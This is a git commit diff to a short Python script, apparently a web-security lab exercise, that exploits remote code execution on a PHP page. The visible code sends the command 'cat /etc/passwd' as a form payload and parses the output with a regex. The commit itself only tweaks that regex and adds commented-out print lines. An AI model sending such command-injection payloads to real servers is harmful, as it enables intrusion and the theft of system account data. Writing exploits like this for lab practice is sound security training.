8733a0ecda6f054ff6272198850df9093067225d
Yumingyuan <timdavid@vip.qq.com>
2019-05-23 15:45:06 +0800

    case31 remote code execution

--- wsb/case31_remote_code_execution.py
+++ wsb/case31_remote_code_execution.py
@@ -3,7 +3,9 @@ import re
 url="http://www.wsb.com/Assignment2/case31.php"
 payload={"cmd_url":"cat /etc/passwd"}
 r=requests.post(url,data=payload)
-re_result=re.findall('<pre>([\w\s\S:/]*)</pre>',r.text)
+re_result=re.findall('<pre>([\w\s\S:/,]*)</pre>',r.text)
+#print(r.text)
+#print(re_result)
 #regex expression: \w \s : /
 #print(r.text)
 re_result=re_result[0].split('\n')
